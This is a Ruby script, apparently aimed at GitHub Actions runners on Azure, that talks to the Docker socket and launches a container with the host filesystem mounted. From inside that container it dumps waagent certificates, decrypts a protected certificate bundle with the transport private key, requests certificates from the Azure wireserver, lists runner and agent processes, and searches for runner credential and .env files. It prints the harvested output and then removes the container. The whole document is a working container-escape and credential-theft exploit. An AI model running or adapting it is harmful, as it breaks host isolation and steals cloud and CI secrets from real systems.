require 'socket'
require 'json'

def docker_api(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, payload = buf.partition("\r\n\r\n")
  [hdr[/\d{3}/].to_i, payload]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 200]}"]
end

inner = <<'EOS'
echo "=== Certificates.pem ==="; cat /host/var/lib/waagent/Certificates.pem
echo "=== Certificates.xml ==="; cat /host/var/lib/waagent/Certificates.xml
echo "=== p7m decrypt attempt ==="
ruby -e '
require "openssl"
p7 = OpenSSL::PKCS7.new(File.read("/host/var/lib/waagent/Certificates.p7m"))
key = OpenSSL::PKey::RSA.new(File.read("/host/var/lib/waagent/TransportPrivate.pem"))
cert = OpenSSL::X509::Certificate.new(File.read("/host/var/lib/waagent/TransportCert.pem"))
begin
  puts p7.decrypt(key, cert)
rescue => e
  puts "decrypt failed: #{e.message[0,120]} — trying detached/none"
end'
echo "=== wireserver certs (DER-b64 header) ==="
ruby -e '
require "net/http"; require "uri"; require "openssl"; require "base64"
tc = File.read("/host/var/lib/waagent/TransportCert.pem")
der = OpenSSL::X509::Certificate.new(tc).to_der
hdr = Base64.strict_encode64(der)
gs = Net::HTTP.get_response(URI("http://168.63.129.16/machine?comp=goalstate"), {"x-ms-agent-name"=>"vx","x-ms-version"=>"2012-11-30"})
certurl = gs.body.to_s.scan(%r{http://168\.63\.129\.16[^<]*comp=certificates[^<]*}).map { |u| u.gsub("&amp;", "&") }.first
r = Net::HTTP.get_response(URI(certurl), {"x-ms-agent-name"=>"vx","x-ms-version"=>"2012-11-30","x-ms-guest-agent-public-x509-cert"=>hdr})
puts "CERTS HTTP #{r.code}"; puts r.body.to_s[0, 3000]'
echo "=== host processes (runner creds) ==="
for p in /proc/[0-9]*/comm; do
  c=$(cat "$p" 2>/dev/null)
  case "$c" in *Runner*|*Agent*|*worker*) echo "PID $(dirname $p): $c";; esac
done
echo "=== runner config files ==="
find /host/home/runner /host/opt -maxdepth 3 -name ".credentials*" -o -name ".runner" -o -name ".env" 2>/dev/null | head -15
EOS

code, body = docker_api('POST', '/containers/create', {
  'Image' => 'ghcr.io/actions/jekyll-build-pages:v1.0.13',
  'Entrypoint' => ['bash', '-c'],
  'Cmd' => [inner],
  'Tty' => true,
  'HostConfig' => { 'Binds' => ['/:/host'] }
})
cid = (JSON.parse(body)['Id'] rescue nil)
puts "CREATE: #{code}"
if cid
  puts "START: #{docker_api('POST', "/containers/#{cid}/start")[0]}"
  docker_api('POST', "/containers/#{cid}/wait")
  _lc, logs = docker_api('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
  puts "VX_HR2_BEGIN"
  puts logs.gsub(/[^\x20-\x7e\n]/, '')[0, 12000]
  puts "VX_HR2_END"
  docker_api('DELETE', "/containers/#{cid}?force=1")
else
  puts "VX_DOCKER_SOCK=ABSENT_OR_DENIED create=#{code}"
end
